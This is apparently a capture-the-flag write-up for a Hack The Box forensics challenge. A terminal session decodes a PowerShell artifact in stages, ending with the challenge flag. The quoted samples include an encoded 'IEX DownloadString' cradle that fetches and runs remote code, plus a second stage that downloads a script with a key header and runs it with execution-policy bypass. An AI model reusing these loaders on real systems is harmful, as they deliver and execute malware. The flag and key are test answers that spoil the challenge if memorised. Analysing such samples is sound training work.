# Thorin’s Amulet
```
┌──(kali㉿kali)-[~/Desktop/htb/cyberapocolapse]
└─$ cat artifact.ps1 
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO

┌──(kali㉿kali)-[~/Desktop/htb/cyberapocolapse]
└─$ printf "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=" | base64 -d
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/htb/cyberapocolapse]
└─$ curl http://94.237.61.252:42986/update
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq


┌──(kali㉿kali)-[~/Desktop/htb/cyberapocolapse]
└─$ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://94.237.61.252:42986/a541a
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""

┌──(kali㉿kali)-[~/Desktop/htb/cyberapocolapse]
└─$ 
```

`4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d` is ASCII code:
`HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`